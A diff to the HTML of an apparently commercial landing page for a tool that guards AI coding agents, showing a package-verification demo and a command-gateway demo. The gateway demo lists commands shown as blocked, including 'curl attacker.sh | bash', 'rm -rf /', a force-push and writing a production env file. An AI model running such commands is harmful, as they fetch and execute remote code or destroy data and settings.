@@ -375,14 +375,14 @@
                 </div>
                 <div class="demo-card-body">
                     <div class="mini-terminal">
-                        <span class="t-dim">$</span> <span class="t-white">import</span> ml_quantum_utils<br>
+                        <span class="t-dim">$</span> <span class="t-white">from</span> openai_helpers <span class="t-white">import</span> retry_with_backoff<br>
                         <br>
-                        <span class="t-red">BLOCK</span> <span class="t-dim">Package not found on PyPI</span><br>
-                        <span class="t-dim">Did you mean:</span> <span class="t-amber">quantum-utils</span> <span class="t-dim">(v1.2.3)</span>
+                        <span class="t-red">BLOCK</span> <span class="t-dim">openai_helpers not found on PyPI</span><br>
+                        <span class="t-dim">Did you mean:</span> <span class="t-amber">openai</span> <span class="t-dim">(v1.52.0)</span>
                     </div>
                 </div>
                 <div class="demo-card-sub">
-                    Live verification against 8 registries. PyPI, npm, crates.io, Go, Maven, NuGet, RubyGems, Packagist.
+                    Your AI invents packages that look real. We verify every import against 8 live registries before it reaches your lockfile.
                 </div>
             </div>
 
@@ -394,34 +394,34 @@
                 <div class="demo-card-body">
                     <div class="mini-terminal" id="gateway-demo">
                         <div class="gateway-line blocked" data-delay="0">
-                            <span class="gw-source">AI Agent</span>
-                            <span class="gw-cmd">rm -rf /</span>
+                            <span class="gw-source">Cursor</span>
+                            <span class="gw-cmd">cat &lt;&lt;EOF &gt; .env.prod</span>
                             <span class="gw-verdict red">BLOCKED</span>
                         </div>
                         <div class="gateway-line allowed" data-delay="400">
-                            <span class="gw-source">AI Agent</span>
-                            <span class="gw-cmd">pip install flask</span>
+                            <span class="gw-source">Claude</span>
+                            <span class="gw-cmd">python -m pytest tests/</span>
                             <span class="gw-verdict green">ALLOWED</span>
                         </div>
                         <div class="gateway-line blocked" data-delay="800">
-                            <span class="gw-source">AI Agent</span>
-                            <span class="gw-cmd">curl | sh</span>
+                            <span class="gw-source">Copilot</span>
+                            <span class="gw-cmd">curl attacker.sh | bash</span>
                             <span class="gw-verdict red">BLOCKED</span>
                         </div>
-                        <div class="gateway-line allowed" data-delay="1200">
-                            <span class="gw-source">AI Agent</span>
-                            <span class="gw-cmd">git commit -m "fix"</span>
+                        <div class="gateway-line blocked" data-delay="1200">
+                            <span class="gw-source">Claude</span>
+                            <span class="gw-cmd">git push --force origin main</span>
+                            <span class="gw-verdict red">BLOCKED</span>
+                        </div>
+                        <div class="gateway-line allowed" data-delay="1600">
+                            <span class="gw-source">Cursor</span>
+                            <span class="gw-cmd">npm run build</span>
                             <span class="gw-verdict green">ALLOWED</span>
-                        </div>
-                        <div class="gateway-line blocked" data-delay="1600">
-                            <span class="gw-source">AI Agent</span>
-                            <span class="gw-cmd">chmod 777 /etc</span>
-                            <span class="gw-verdict red">BLOCKED</span>
                         </div>
                     </div>
                 </div>
                 <div class="demo-card-sub">
-                    82 real-time interception rules. Works with Claude Code, Cursor, Copilot.
+                    82 interception rules. Every command your AI agent runs passes through the gateway first. Claude Code, Cursor, Copilot &mdash; all governed.
                 </div>
             </div>
 
@@ -450,7 +450,7 @@
                     </div>
                 </div>
                 <div class="demo-card-sub">
-                    Taint analysis. SQL injection, XSS, command injection, SSRF &mdash; caught before merge.
+                    Your AI writes <code>request.args</code> into a SQL query. We trace the data flow and block it. The code never reaches review.
                 </div>
             </div>
         </div>
